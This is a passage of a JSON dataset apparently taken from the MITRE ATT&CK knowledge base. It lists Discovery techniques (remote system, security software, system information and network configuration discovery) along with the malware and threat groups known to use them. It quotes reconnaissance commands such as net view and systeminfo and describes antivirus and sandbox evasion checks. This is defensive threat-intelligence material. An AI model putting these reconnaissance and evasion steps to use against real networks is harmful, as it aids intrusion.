                    "Description": "Stealth Falcon malware attempts to determine the installed version of .NET by querying the Registry.[36]"
                },
                {
                    "Name": "SynAck",
                    "Description": "SynAck enumerates Registry keys associated with event logs.[37]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "A Threat Group-3390 tool can read and decrypt stored Registry values.[38]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla surveys a system upon check-in to discover information in the Windows Registry with the reg query command.[39]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer checks the system for certain Registry keys.[40]"
                },
                {
                    "Name": "WINDSHIELD",
                    "Description": "WINDSHIELD can gather Registry values.[41]"
                }
            ]
        },
        "Remote System Discovery": {
            "Name": "Remote System Discovery",
            "Description": "Adversaries will likely attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used. WindowsExamples of tools and commands that acquire this information include \"ping\" or \"net view\" using Net.MacSpecific to Mac, the bonjour protocol to discover additional Mac-based systems within the same broadcast domain. Utilities such as \"ping\" and others can be used to gather information about remote systems.LinuxUtilities such as \"ping\" and others can be used to gather information about remote systems.\n",
            "ID": "T1018",
            "Tactic": "Discovery",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "Network protocol analysis, Process monitoring, Process use of network, Process command-line parameters",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT3",
                    "Description": "APT3 has a tool that can detect the existence of remote systems.[1][2]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER typically use ping and Net to enumerate systems.[3]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike uses the native Windows Network Enumeration APIs to interrogate and discover targets in a Windows Active Directory network.[4]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie runs the net view command"
                },
                {
                    "Name": "Deep Panda",
                    "Description": "Deep Panda has used ping to identify other machines of interest.[5]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 likely obtained a list of hosts in the victim environment.[6]"
                },
                {
                    "Name": "FIN5",
                    "Description": "FIN5 has used the open source tool Essential NetTools to map the network and build a list of targets.[7]"
                },
                {
                    "Name": "FIN6",
                    "Description": "FIN6 used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.[8]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 uses dsquery and other Active Directory utilities to enumerate hosts.[9]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang has used network scanning and enumeration tools, including Ping.[10]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs collects a list of available servers with the command net view.[11]"
                },
                {
                    "Name": "Leafminer",
                    "Description": "Leafminer used Microsoft’s Sysinternals tools to gather detailed information about remote systems.[12]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass uses scripts to enumerate IP ranges on the victim network. menuPass has also issued the command net view /domain to a PlugX implant to gather information about remote systems on the network.[13][14]"
                },
                {
                    "Name": "MURKYTOP",
                    "Description": "has the capability to identify remote hosts on connected networks.[15]"
                },
                {
                    "Name": "Net",
                    "Description": "Commands such as net view can be used in Net to gather information about available remote systems.[16]"
                },
                {
                    "Name": "OSInfo",
                    "Description": "OSInfo performs a connection test to discover remote systems in the network[1]"
                },
                {
                    "Name": "Ping",
                    "Description": "Ping can be used to identify remote systems within a network.[17]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "RATANKBA runs the net view /domain and net view commands.[18]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec can ping or traceroute a remote host.[19]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon scans the C-class subnet of the IPs on the victim's interfaces.[20]"
                },
                {
                    "Name": "SHOTPUT",
                    "Description": "SHOTPUT has a command to list all servers in the domain, as well as one to locate domain controllers on a domain.[21]"
                },
                {
                    "Name": "Sykipot",
                    "Description": "Sykipot may use net view /domain to display hostnames of available systems on a network.[22]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has used the net view command.[23]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla surveys a system upon check-in to discover remote systems on a local network using the net view and net view /DOMAIN commands.[24]"
                },
                {
                    "Name": "yty",
                    "Description": "yty uses the net view command for discovery.[25]"
                }
            ]
        },
        "Security Software Discovery": {
            "Name": "Security Software Discovery",
            "Description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules, anti-virus, and virtualization. These checks may be built into early-stage remote access tools.WindowsExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.MacIt's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n",
            "ID": "T1063",
            "Tactic": "Discovery",
            "Platform: ": "macOS, Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "CHOPSTICK",
                    "Description": "CHOPSTICK checks for anti-virus, forensics, and virtualization software.[1]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie attempts to detect several anti-virus products.[2]"
                },
                {
                    "Name": "CozyCar",
                    "Description": "The main CozyCar dropper checks whether the victim has an anti-virus product installed. If the installed product is on a predetermined list, the dropper will exit. Newer versions of CozyCar will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit.[3]"
                },
                {
                    "Name": "Crimson",
                    "Description": "Crimson contains a command to collect information about anti-virus software on the victim.[4]"
                },
                {
                    "Name": "DustySky",
                    "Description": "DustySky checks for the existence of anti-virus.[5]"
                },
                {
                    "Name": "Dyre",
                    "Description": "The Dyre crimeware toolkit has refined its detection of sandbox analysis environments by inspecting the process list and Registry.[6]"
                },
                {
                    "Name": "Felismus",
                    "Description": "Felismus checks for processes associated with anti-virus vendors.[7]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has used Registry keys to detect and avoid executing in potential sandboxes.[8]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher probes the system to check for sandbox/virtualized environments and other antimalware processes.[9][10]"
                },
                {
                    "Name": "Flame",
                    "Description": "Flame identifies security software such as antivirus through the Security module.[11][12]"
                },
                {
                    "Name": "Gold Dragon",
                    "Description": "Gold Dragon checks for anti-malware products and processes.[13]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN checks for the presence of certain security-related processes and deletes its installer/uninstaller component if it identifies any of them.[14]"
                },
                {
                    "Name": "jRAT",
                    "Description": "jRAT uses WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.[15]"
                },
                {
                    "Name": "Kasidet",
                    "Description": "Kasidet has the ability to identify any anti-virus installed on the infected system.[16]"
                },
                {
                    "Name": "More_eggs",
                    "Description": "More_eggs can obtain information on installed anti-malware programs.[17]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito's installer searches the Registry and system to see if specific antivirus tools are installed on the system.[18]"
                },
                {
                    "Name": "Naikon",
                    "Description": "Naikon uses commands such as netsh advfirewall firewall to discover local firewall settings.[19]"
                },
                {
                    "Name": "netsh",
                    "Description": "netsh can be used to discover system firewall settings.[20][21]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE performs several anti-VM and sandbox checks on the victim's machine.[22]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork scanned the \"Program Files\" directories for a directory with the string \"Total Security\" (the installation path of the \"360 Total Security\" antivirus tool).[23]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS has detected security tools.[24]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER may collect information the victim's anti-virus software.[25]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "A module in Prikormka collects information from the victim about installed anti-virus software.[26]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec has a plugin to detect active drivers of some security products.[27]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "RogueRobin enumerates running processes to search for Wireshark and Windows Sysinternals suite.[28]"
                },
                {
                    "Name": "ROKRAT",
                    "Description": "ROKRAT checks for sandboxing libraries and debugging tools.[29]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM can obtain information about security software on the victim.[30]"
                },
                {
                    "Name": "StreamEx",
                    "Description": "StreamEx has the ability to scan for security tools such as firewalls and antivirus tools.[31]"
                },
                {
                    "Name": "T9000",
                    "Description": "T9000 performs checks for various antivirus and security products during installation.[32]"
                },
                {
                    "Name": "Tasklist",
                    "Description": "Tasklist can be used to enumerate security software currently running on a system by process name of known products.[33]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN uses WMI to check for anti-virus software installed on the system.[34]"
                },
                {
                    "Name": "Wingbird",
                    "Description": "Wingbird checks for the presence of Bitdefender security software.[35]"
                },
                {
                    "Name": "yty",
                    "Description": "yty checks for ant-sandboxing software such as virtual PC, sandboxie, and VMware.[36]"
                }
            ]
        },
        "System Information Discovery": {
            "Name": "System Information Discovery",
            "Description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture.WindowsExample commands and utilities that obtain this information include ver, Systeminfo, and dir within cmd for identifying information based on present files and directories.MacOn Mac, the systemsetup command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the system_profiler gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions.\n",
            "ID": "T1082",
            "Tactic": "Discovery",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, Process command-line parameters",
            "CAPEC ID: ": "CAPEC-311",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "4H RAT",
                    "Description": "4H RAT sends an OS version identifier in its beacons.[1]"
                },
                {
                    "Name": "admin@338",
                    "Description": "admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about the OS: ver >> %temp%\\download systeminfo >> %temp%\\download[2]"
                },
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL can run Systeminfo to gather information about the victim.[3][4]"
                },
                {
                    "Name": "APT19",
                    "Description": "APT19 collected system architecture information. APT19 used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine.[5][6]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has a tool that can obtain information about the local system.[7][8]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 collects the OS version and computer name.[9]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 collects the computer name, the BIOS model, and execution path.[10]"
                },
                {
                    "Name": "Backdoor.Oldrea",
                    "Description": "Backdoor.Oldrea collects information about the OS and computer name.[11]"
                },
                {
                    "Name": "BACKSPACE",
                    "Description": "During its initial execution, BACKSPACE extracts operating system information from the infected host.[12]"
                },
                {
                    "Name": "BADCALL",
                    "Description": "BADCALL collects the computer name and host name on the compromised system.[13]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot gathers system information, network addresses, disk type, disk free space, and the operation system version.[14][15]"
                },
                {
                    "Name": "Bisonal",
                    "Description": "Bisonal has a command to gather system information from the victim’s machine.[16]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy has used Systeminfo to gather the OS version, as well as information on the system configuration, BIOS, the motherboard, and the processor.[17][18]"
                },
                {
                    "Name": "Brave Prince",
                    "Description": "Brave Prince collects hard drive content and system configuration information.[19]"
                },
                {
                    "Name": "BUBBLEWRAP",
                    "Description": "BUBBLEWRAP collects system information, including the operating system version and hostname.[2]"
                },
                {
                    "Name": "ChChes",
                    "Description": "ChChes collects the victim hostname, window resolution, and Microsoft Windows version.[20][21]"
                },
                {
                    "Name": "cmd",
                    "Description": "cmd can be used to find information about the operating system.[22]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie collects the hostname of the victim machine.[23]"
                },
                {
                    "Name": "CORESHELL",
                    "Description": "CORESHELL collects hostname, volume serial number and OS version data from the victim and sends the information to its C2 server.[24]"
                },
                {
                    "Name": "CozyCar",
                    "Description": "A system info module in CozyCar gathers information on the victim host’s configuration.[25]"
                },
                {
                    "Name": "Crimson",
                    "Description": "Crimson contains a command to collect the victim PC name and operating system.[26]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi gathers the name of the local host, version of GNU Compiler Collection (GCC), and the system information about the CPU, machine, and operating system.[27]"
                },
                {
                    "Name": "DownPaper",
                    "Description": "DownPaper collects the victim host name and serial number, and then sends the information to the C2 server.[28]"
                },
                {
                    "Name": "DustySky",
                    "Description": "DustySky extracts basic information about the operating system.[29]"
                },
                {
                    "Name": "Elise",
                    "Description": "Elise executes systeminfo after initial communication is made to the remote server.[30]"
                },
                {
                    "Name": "Emissary",
                    "Description": "Emissary has the capability to execute ver, systeminfo, and gpresult commands.[31]"
                },
                {
                    "Name": "FALLCHILL",
                    "Description": "FALLCHILL can collect operating system (OS) version information, processor information, system name, and information about installed disks from the victim.[32]"
                },
                {
                    "Name": "Felismus",
                    "Description": "Felismus collects the system information, including hostname and OS version, and sends it to the C2 server.[33]"
                },
                {
                    "Name": "FELIXROOT",
                    "Description": "FELIXROOT collects the victim’s computer name, processor architecture, OS version, and volume serial number.[34]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher checks if the victim OS is 32 or 64-bit.[35][36]"
                },
                {
                    "Name": "Gamaredon Group",
                    "Description": "A Gamaredon Group file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.[37]"
                },
                {
                    "Name": "Gold Dragon",
                    "Description": "Gold Dragon collects endpoint information using the systeminfo command.[19]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT collects the MAC address, computer name, and CPU information.[38]"
                },
                {
                    "Name": "HALFBAKED",
                    "Description": "HALFBAKED can obtain information about the OS, processor, and BIOS.[39]"
                },
                {
                    "Name": "HAPPYWORK",
                    "Description": "can collect system information, including computer name, system manufacturer, IsDebuggerPresent state, and execution path.[40]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee gathers computer name and information using the systeminfo command.[41]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq creates a backdoor through which remote attackers can retrieve information such as computer name, OS version, processor speed, memory size, and CPU speed.[42]"
                },
                {
                    "Name": "InnaputRAT",
                    "Description": "InnaputRAT gathers volume drive information and system information.[43]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole can gather information on the mapped drives, OS version, computer name, and memory size.[44]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "JHUHUGIT obtains a build identifier as well as victim hard drive information from Windows registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum. Another JHUHUGIT variant gathers the victim storage volume serial number and the storage device name.[45][46]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN can obtain system information such as OS version and disk space.[47]"
                },
                {
                    "Name": "KARAE",
                    "Description": "KARAE can collect system information.[40]"
                },
                {
                    "Name": "Kasidet",
                    "Description": "Kasidet has the ability to obtain a victim's system name and operating system version.[48]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar gathers information on the system and local drives.[49]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang performs operating system information discovery using systeminfo.[50][51]"
                },
                {
                    "Name": "KEYMARBLE",
                    "Description": "KEYMARBLE has the capability to collect the computer name, language settings, the OS version, CPU information, disk devices, and time elapsed since system start.[52]"
                },
                {
                    "Name": "KOMPROGO",
                    "Description": "KOMPROGO is capable of retrieving information about the infected system.[53]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs collects OS version information such as registered owner details, manufacturer details, processor type, available storage, installed patches, hostname, version info, system date, and other system information by using the commands systeminfo, net config workstation, hostname, ver, set, and date /t.[54]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Several Lazarus Group malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by Lazarus Group also collects disk space information and sends it to its C2 server.[55][56][57][58][59]"
                },
                {
                    "Name": "Linfo",
                    "Description": "Linfo creates a backdoor through which remote attackers can retrieve system information.[60]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.[61]"
                },
                {
                    "Name": "MirageFox",
                    "Description": "MirageFox can collect CPU and architecture information from the victim’s machine.[62]"
                },
                {
                    "Name": "Mis-Type",
                    "Description": "The initial beacon packet for Mis-Type contains the operating system version and file system of the victim.[63]"
                },
                {
                    "Name": "Misdat",
                    "Description": "The initial beacon packet for Misdat contains the operating system version of the victim.[63]"
                },
                {
                    "Name": "MobileOrder",
                    "Description": "MobileOrder has a command to upload to its C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, and other information.[64]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution.[65]"
                },
                {
                    "Name": "More_eggs",
                    "Description": "More_eggs has the capability to gather the OS version and computer name.[66]"
                },
                {
                    "Name": "MURKYTOP",
                    "Description": "has the capability to retrieve information about the OS.[67]"
                },
                {
                    "Name": "Naid",
                    "Description": "Naid collects a unique identifier (UID) from a compromised host.[68]"
                },
                {
                    "Name": "NanHaiShu",
                    "Description": "NanHaiShu can gather the victim computer name and serial number.[69]"
                },
                {
                    "Name": "NavRAT",
                    "Description": "NavRAT uses systeminfo on a victim’s machine.[70]"
                },
                {
                    "Name": "NDiskMonitor",
                    "Description": "NDiskMonitor obtains the victim computer name and encrypts the information to send over its C2 channel.[71]"
                },
                {
                    "Name": "NETWIRE",
                    "Description": "NETWIRE can discover and collect victim system information.[72]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has run hostname and systeminfo on a victim.[73][74]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks.[75]"
                },
                {
                    "Name": "Orz",
                    "Description": "Orz can gather the victim OS version and whether it is 64 or 32 bit.[69]"
                },
                {
                    "Name": "OSInfo",
                    "Description": "OSInfo discovers information about the infected machine.[7]"
                },
                {
                    "Name": "Pasam",
                    "Description": "Pasam creates a backdoor through which remote attackers can retrieve information such as hostname and free disk space.[76]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork collected the victim computer name, OS version, and architecture type and sent the information to its C2 server. Patchwork also enumerated all available drives on the victim's machine.[77][71]"
                },
                {
                    "Name": "PinchDuke",
                    "Description": "PinchDuke gathers system configuration information.[78]"
                },
                {
                    "Name": "Pisloader",
                    "Description": "Pisloader has a command to collect victim system information, including the system name and OS version.[79]"
                },
                {
                    "Name": "PLAINTEE",
                    "Description": "PLAINTEE collects general system enumeration data about the infected machine and checks the OS version.[80]"
                },
                {
                    "Name": "POORAIM",
                    "Description": "POORAIM can identify system information, including battery status.[40]"
                },
                {
                    "Name": "PowerDuke",
                    "Description": "PowerDuke has commands to get information about the victim's name, build, version, serial number, and memory usage.[81]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS can retrieve OS name/architecture and computer/domain name information from compromised hosts.[82]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER may collect information about the system by running hostname and systeminfo on a victim.[83]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "A module in Prikormka collects information from the victim about Windows OS version, computer name, battery info, and physical memory.[84]"
                },
                {
                    "Name": "Proxysvc",
                    "Description": "Proxysvc collects the OS version, country name, MAC address, computer name, physical memory statistics, and volume information for all drives on the system.[59]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can grab a system’s information including the OS version, architecture, etc.[85]"
                },
                {
                    "Name": "QuasarRAT",
                    "Description": "QuasarRAT has a command to gather system information from the victim’s machine.[86]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "RATANKBA gathers information about the OS architecture, OS name, and OS version/Service pack.[87][88]"
                },
                {
                    "Name": "Reaver",
                    "Description": "Reaver collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information.[89]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information.[21][90]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec can obtain the OS version information, computer name, processor architecture, machine role, and OS edition.[91]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "RogueRobin gathers BIOS versions and manufacturers, the number of CPU cores, the total physical memory, and the computer name.[92]"
                },
                {
                    "Name": "ROKRAT",
                    "Description": "ROKRAT gathers the computer name and checks the OS version to ensure it doesn’t run on a Windows XP or Windows Server 2003 systems.[93][94]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM can obtain the computer name, OS version, and default language identifier.[95]"
                },
                {
                    "Name": "RunningRAT",
                    "Description": "RunningRAT gathers the OS version, logical drives information, processor information, and volume information.[19]"
                },
                {
                    "Name": "S-Type",
                    "Description": "The initial beacon packet for S-Type contains the operating system version and file system of the victim.[63]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon obtains the victim's operating system version and keyboard layout and sends the information to the C2 server.[96]"
                },
                {
                    "Name": "SHUTTERSPEED",
                    "Description": "SHUTTERSPEED can collect system information.[40]"
                },
                {
                    "Name": "SLOWDRIFT",
                    "Description": "SLOWDRIFT collects and sends system information to its C2.[40]"
                },
                {
                    "Name": "SOUNDBITE",
                    "Description": "SOUNDBITE is capable of gathering system information.[53]"
                },
                {
                    "Name": "Sowbug",
                    "Description": "Sowbug obtained OS version and hardware configuration from a victim.[97]"
                },
                {
                    "Name": "SslMM",
                    "Description": "SslMM sends information to its hard-coded C2, including OS version, service pack information, processor speed, system name, and OS install date.[98]"
                },
                {
                    "Name": "Stealth Falcon",
                    "Description": "Stealth Falcon malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory.[99]"
                },
                {
                    "Name": "StreamEx",
                    "Description": "StreamEx has the ability to enumerate system information.[100]"
                },
                {
                    "Name": "SynAck",
                    "Description": "SynAck gathers computer names, OS version info, and also checks installed keyboard layouts to estimate if it has been launched from a certain list of countries.[101]"
                },
                {
                    "Name": "Sys10",
                    "Description": "Sys10 collects the computer name, OS versioning information, and OS install date and sends the information to the C2.[98]"
                },
                {
                    "Name": "Systeminfo",
                    "Description": "Systeminfo can be used to gather information about the operating system.[102]"
                },
                {
                    "Name": "T9000",
                    "Description": "T9000 gathers and beacons the operating system build number and CPU Architecture (32-bit/64-bit) during installation.[103]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot gathers the OS version, CPU type, amount of RAM available from the victim’s machine.[104][105]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla surveys a system upon check-in to discover operating system configuration details using the systeminfo and set commands.[106]"
                },
                {
                    "Name": "TURNEDUP",
                    "Description": "TURNEDUP is capable of gathering system information.[107]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "TYPEFRAME can gather the disk volume information.[108]"
                },
                {
                    "Name": "Unknown Logger",
                    "Description": "Unknown Logger can obtain information about the victim computer name, physical memory, country, and date.[109]"
                },
                {
                    "Name": "UPPERCUT",
                    "Description": "UPPERCUT has the capability to gather the system’s hostname and OS version.[110]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN collects the OS name, machine name, and architecture information.[111]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer can gather system information, the computer name, OS version, drive and serial information from the victim's machine.[112][113][114]"
                },
                {
                    "Name": "WINDSHIELD",
                    "Description": "WINDSHIELD can gather the victim computer name.[53]"
                },
                {
                    "Name": "WINERACK",
                    "Description": "WINERACK can gather information about the host.[40]"
                },
                {
                    "Name": "Wingbird",
                    "Description": "Wingbird checks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit.[115]"
                },
                {
                    "Name": "WinMM",
                    "Description": "WinMM collects the system name, OS version including service pack, and system install date and sends the information to the C2 server.[98]"
                },
                {
                    "Name": "XAgentOSX",
                    "Description": "XAgentOSX contains the getInstalledAPP function to run ls -la /Applications to gather what applications are installed.[116]"
                },
                {
                    "Name": "yty",
                    "Description": "yty gathers the computer name, the serial number of the main disk volume, CPU information, Microsoft Windows version, and runs the command systeminfo.[117]"
                },
                {
                    "Name": "Zebrocy",
                    "Description": "Zebrocy collects the computer name and serial number for the storage volume C:.[118]"
                },
                {
                    "Name": "ZeroT",
                    "Description": "ZeroT gathers the victim's computer name, Windows version, and system language, and then sends it to its C2 server.[119]"
                },
                {
                    "Name": "ZLib",
                    "Description": "ZLib has the ability to enumerate system information.[63]"
                }
            ]
        },
        "System Network Configuration Discovery": {
            "Name": "System Network Configuration Discovery",
            "Description": "Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n",
            "ID": "T1016",
            "Tactic": "Discovery",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, Process command-line parameters",
            "CAPEC ID: ": "CAPEC-309",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "admin@338",
                    "Description": "admin@338 actors used the following command after exploiting a machine with LOWBALL malware to acquire information about local networks: ipconfig /all >> %temp%\\download[1]"
                },
                {
                    "Name": "Agent.btz",
                    "Description": "Agent.btz collects the network adapter’s IP and MAC address as well as IP addresses of the network adapter’s default gateway, primary/secondary WINS, DHCP, and DNS servers, and saves them into a log file.[2]"
                },
                {
                    "Name": "APT19",
                    "Description": "APT19 used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine.[3]"
                },
                {
                    "Name": "APT3",
                    "Description": "A keylogging tool used by APT3 gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway.[4][5]"
                },
                {
                    "Name": "Arp",
                    "Description": "Arp can be used to display ARP configuration information on the host."
                },
                {
                    "Name": "Backdoor.Oldrea",
                    "Description": "Backdoor.Oldrea collects information about the Internet adapter configuration.[6]"
                },
                {
                    "Name": "BADCALL",
                    "Description": "BADCALL collects the network adapter information.[7]"
                },
                {
                    "Name": "Bisonal",
                    "Description": "Bisonal can execute ipconfig on the victim’s machine.[8]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy has gathered information about network IP configurations using ipconfig.exe and about routing tables using route.exe.[9][10]"
                },
                {
                    "Name": "Brave Prince",
                    "Description": "Brave Prince gathers network configuration information as well as the ARP cache.[11]"
                },
                {
                    "Name": "Calisto",
                    "Description": "Calisto runs the ifconfig command to obtain the IP address from the victim’s machine.[12]"
                },
                {
                    "Name": "Catchamas",
                    "Description": "Catchamas gathers the Mac address, IP address, and the network adapter information from the victim’s machine.[13]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie uses ipconfig /all and route PRINT to identify network adapter and interface information.[14]"
                },
                {
                    "Name": "Crimson",
                    "Description": "Crimson contains a command to collect the victim MAC address and LAN IP.[15]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 used batch scripts to enumerate network information, including information about trusts, zones, and the domain.[16]"
                },
                {
                    "Name": "Duqu",
                    "Description": "The reconnaissance modules used with Duqu can collect information on network configuration.[17]"
                },
                {
                    "Name": "Elise",
                    "Description": "Elise executes ipconfig /all after initial communication is made to the remote server.[18]"
                },
                {
                    "Name": "Emissary",
                    "Description": "Emissary has the capability to execute the command ipconfig /all.[19]"
                },
                {
                    "Name": "FALLCHILL",
                    "Description": "FALLCHILL collects MAC address and local IP address information from the victim.[20]"
                },
                {
                    "Name": "Felismus",
                    "Description": "Felismus collects the victim LAN IP address and sends it to the C2 server.[21]"
                },
                {
                    "Name": "GeminiDuke",
                    "Description": "GeminiDuke collects information on network settings and Internet proxy settings from the victim.[22]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT collects the victim IP address, MAC address, as well as the victim account domain name.[23]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq creates a backdoor through which remote attackers can retrieve IP addresses of compromised machines.[24][25]"
                },
                {
                    "Name": "ifconfig",
                    "Description": "ifconfig can be used to display adapter configuration on Unix systems, including information for TCP/IP, DNS, and DHCP."
                },
                {
                    "Name": "iKitten",
                    "Description": "iKitten will look for the current IP address.[26]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole gathers informatin on the IP forwarding table, MAC address, and network SSID.[27]"
                },
                {
                    "Name": "ipconfig",
                    "Description": "ipconfig can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP."
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "A JHUHUGIT variant gathers network interface card information.[28]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN can obtain network information, including DNS, IP, and proxies.[29]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar gathers information about network adapters.[30]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang performs local network configuration discovery using ipconfig.[31][32]"
                },
                {
                    "Name": "KEYMARBLE",
                    "Description": "KEYMARBLE gathers the MAC address of the victim’s machine.[33]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can retrieve information about the Windows domain.[34]"
                },
                {
                    "Name": "Kwampirs",
